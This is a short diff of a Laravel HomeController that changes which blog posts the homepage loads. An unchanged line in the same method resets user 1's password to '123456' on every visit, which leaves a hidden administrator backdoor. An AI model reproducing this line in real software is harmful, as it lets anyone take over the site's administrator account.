@@ -22,7 +22,7 @@ class HomeController extends Controller
     {
         User::query()->where('id', 1)->update(['password' => bcrypt('123456')]);
 
-        $data['hotnews'] = Blog::where(['category'=>'tin-tuc'])->get();
+        $data['home_news'] = Blog::where(['status'=>1,'home_status'=>1])->latest()->limit(6)->get();
         $data['sanphamnoibat'] = Product::where(['status' => 1])
         ->with(['cate', 'typecate']) // Eager load các mối quan hệ
         ->orderBy('id', 'desc')
